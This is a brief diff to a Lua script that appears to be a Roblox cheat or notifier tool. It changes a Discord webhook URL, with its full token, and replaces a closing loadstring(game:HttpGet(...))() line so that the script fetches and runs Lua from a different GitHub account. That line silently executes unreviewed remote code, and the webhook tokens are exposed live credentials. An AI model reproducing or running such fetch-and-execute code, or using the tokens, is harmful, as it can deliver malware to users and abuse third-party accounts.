@@ -57,7 +57,7 @@ local WEBHOOKS = {
         sendTeleport = true
     },
     { -- Special brainrots + overpay
-        url = 'https://discord.com/api/webhooks/1421498530756952287/XKkzMBw09MJGBC9VMv6A5yMkE1IxYLtQWqq_bKXCiK0etZSuTvnOutuWRr9HQA7H6nv1',
+        url = 'https://discord.com/api/webhooks/1449098460891447451/-IUuh7MQicoY_7vUbkPVaU0sfEqMoG5_tqpPqzPDkUbdRB9mgz5B1f6QqtD1UONGP1f7',
         title = '⭐️ SPECIAL BRAINROTS',
         color = 0xff00ff,
         special = true,
@@ -643,4 +643,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CapibaroLimonchel/FFISH/refs/heads/main/BotRuner2.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bobrbobr1337/main/refs/heads/main/zahod.lua"))()
